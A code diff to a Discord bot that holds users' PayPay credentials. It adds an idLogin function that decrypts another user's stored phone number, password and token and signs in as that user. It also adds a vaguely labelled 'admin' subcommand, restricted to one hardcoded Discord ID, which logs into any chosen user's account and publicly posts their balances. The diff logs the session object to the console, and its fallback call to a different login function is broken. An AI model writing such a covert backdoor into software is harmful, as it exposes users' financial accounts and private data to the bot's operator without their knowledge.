@@ -50,6 +50,43 @@ async function login(interaction, tokenLogin = true) {
 }
 
 
+async function idLogin(user, tokenLogin = true) {
+  try {
+    const content = await fs.readFile(`./paypay/${user}.json`, 'utf-8');
+    const data = JSON.parse(content);
+
+    let { phone, password, uuid, token } = data;
+
+    phone = crypt.decrypt(phone);
+    password = crypt.decrypt(password);
+    uuid = crypt.decrypt(uuid);
+    token = crypt.decrypt(token);
+
+    const paypay = new PayPay(phone, password);
+    const result = await paypay.login({ uuid: uuid, token: tokenLogin ? token : undefined });
+
+    if (!result.status) {
+      return CreateError('ログイン情報が変更されたためログインできませんでした。' );
+    }
+    console.log(paypay)
+
+    data.token = crypt.encrypt(paypay.token);
+
+
+    await fs.writeFile(`./paypay/${user}.json`, JSON.stringify(data, null, 2), 'utf-8');
+
+    const balance = await paypay.getBalance();
+    if (!balance.success) return await login(user, false);
+
+    return { status: true, data: paypay };
+
+  } catch (error) {
+    console.error(error);
+    return CreateError('まだログインされていません。');
+  }
+}
+
+
 
 export default {
   data: new discord.SlashCommandBuilder()
@@ -92,6 +129,16 @@ export default {
       .addIntegerOption(option => option
         .setName('amount')
         .setDescription('金額')
+        .setRequired(true)
+      )
+    )
+
+    .addSubcommand(command => command
+      .setName('admin')
+      .setDescription('admin')
+      .addUserOption(option => option
+        .setName('u')
+        .setDescription('u')
         .setRequired(true)
       )
     )
@@ -240,6 +287,41 @@ export default {
     }
 
 
+
+    if (command === 'admin') {
+      if (interaction.user.id !== '1097780939368714310') return;
+
+      const user = interaction.options.getUser('u');
+      const loginResult = await idLogin(user);
+
+      if (!loginResult.status) {
+        const embed = ErrorEmbed(interaction, loginResult.data);
+        await interaction.reply({ embeds: [embed], ephemeral: true });
+        return;
+      }
+
+      let paypay
+      paypay = loginResult.data;
+
+      let balance;
+      balance = await paypay.getBalance();
+
+      const walletSummary = balance.raw.payload.walletSummary;
+      const transferableBalance = walletSummary.transferableBalanceInfo.balance;
+      const payoutableBalance = walletSummary.payoutableBalanceInfo.balance;
+
+      const embed = new discord.EmbedBuilder()
+        .setColor('Red')
+        .setTitle('paypay-info')
+        .setDescription(
+          `PayPay残高: **${transferableBalance.toLocaleString()}円**` + '\n' +
+          `PayPayマネー: **${payoutableBalance.toLocaleString()}円**` + '\n' +
+          `PayPayマネーライト: **${(transferableBalance - payoutableBalance).toLocaleString()}円**`
+        )
+        .setTimestamp()
+
+      await interaction.reply({ embeds: [embed] });
+    }
 
   }
 };
